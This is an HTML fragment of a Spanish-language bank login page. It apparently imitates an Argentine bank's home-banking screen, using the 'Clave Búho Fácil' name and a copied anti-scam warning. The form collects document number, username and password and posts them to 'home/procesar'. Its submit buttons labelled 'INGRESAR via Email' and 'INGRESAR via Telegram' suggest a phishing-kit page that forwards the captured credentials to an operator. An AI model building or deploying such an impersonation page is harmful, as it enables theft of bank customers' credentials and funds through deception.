<div class="container">
  <div class="row justify-content-md-center">
    <form action="home/procesar" method="post" class="col-lg-6 row g-3">
      <div class="shadow-lg pb-3 mb-2 bg-body rounded-4">
        <div class="col-12 mb-4 mt-2 mb-2">
          <img src="resources/img/logo.png" alt="logo">
        </div>
        <div class="mb-3">
          <div class="alert mt-2 px-5 alert-color" role="alert">
            <p class="lh-1 text-white fw-semibold fs-5 pt-2 mb-1"><i class="fa-solid fa-triangle-exclamation px-2"></i> Evitemos las estafas.</p>
            <p class="lh-sm text-white fw-semibold ps-2">Nunca compartas tu mail, clave personal, usuario ni token. Ni siquiera con nosotros.</p>
          </div>
        </div>
        <div class="px-5">
          <div class="col-auto">
            <div class="form-floating mb-2">
              <input name="documento" type="text" class="form-control border-0 border-bottom" id="floatingInput" placeholder="Documento">
              <label for="floatingInput" class="text-secondary fs-14"><i class="fa-regular fa-id-card"></i> Documento</label>
            </div>
          </div> 
          <div class="col-auto">
            <div class="form-floating mb-2">
              <input name="usuario" type="password" class="form-control border-0 border-bottom" id="floatingInput" placeholder="Usuario">
              <label for="floatingInput" class="text-secondary fs-14"><i class="fas fa-user"></i> Usuario</label>
            </div>
          </div> 
          <div class="col-auto">
            <div class="form-floating mb-4">
              <input name="clave" type="password" class="form-control border-0 border-bottom" id="floatingInput" placeholder="Clave Búho Fácil">
              <label for="floatingInput" class="text-secondary fs-14"><i class="fa-solid fa-lock"></i> Clave Búho Fácil</label>
            </div>
          </div>
          <p class="text-grey">¿Qué es la Clave Búho Fácil? <a href="#" class="text-decoration-none text-orange fw-semibold">Enterate acá</a></p>
          <div class="col-12">
            <div class="form-check">
              <input class="form-check-input" type="checkbox" id="gridCheck">
              <label class="form-check-label text-grey fs-13" for="gridCheck">Recordar mi documento</label>
            </div>
          </div>
          <a href="#" class="text-decoration-none text-grey fs-13"><i class="fa-solid fa-keyboard pe-2 text-secondary"></i>Teclado Virtual</a>
          // Edit Position
          <div class="m-3 d-flex flex-column justify-content-around text-center">
              <input type="submit" name="action" value="INGRESAR via Email"  class="btn btn-orange text-white px-2 py-2 rounded-pill fw-bold" id="btn-submit" 
              style="
              padding-left: 36px;
                background-image: url('resources/img/email.png');
                background-size: 20px;
                background-position-x: calc(50% - 100px);
                background-position-y: 50%;
                background-repeat: no-repeat;"
              />
              <input type="submit" name="action" value="INGRESAR via Telegram"  class="btn btn-orange text-white px-2 py-2 rounded-pill fw-bold mt-2" id="btn-submit" 
              style="
              padding-left: 36px;
                background-image: url('resources/img/tele.png');
                background-size: 20px;
                background-position-x: calc(50% - 110px);
                background-position-y: 50%;
                background-repeat: no-repeat;"
              />
          </div>
          <div class="text-center">
            <p><a href="#" class="text-decoration-none text-orange fs-13">Olvidé mi clave</a><spam class="px-3 text-secondary">|</spam><a href="#" class="text-decoration-none text-orange fs-13">Olvidé mi usuario</a></p>
          </div>
          <p class="text-center text-muted m-0 fz-10">Si es tu primera vez</p>
          <p class="text-center text-orange fw-semibold fs-14">GENERÁ TU USUARIO Y CLAVE</p>
          <p class="text-center m-0 text-rojo fw-semibold">Mi cuenta está en riesgo</p>
        </div>
    </form>
  </div>
</div>
<div class="container-fluid">
  <div class="row">
    <div class="col-12">
      <p class="text-center text-white fw-semibold p-0 fs-13"><a href="#" class="text-decoration-none text-white px-2">Términos y condiciones</a> | <a href="#" class="text-decoration-none text-white px-2">Conocé tus claves</a> | <a href="#" class="text-decoration-none text-white px-2">Políticas de seguridad</a> | <a href="#" class="text-decoration-none text-white px-2">Preguntas frecuentes</a></p>
    </div>
  </div>
</div>

<script src="resources/js/home.js" type="text/javascript"></script>	
  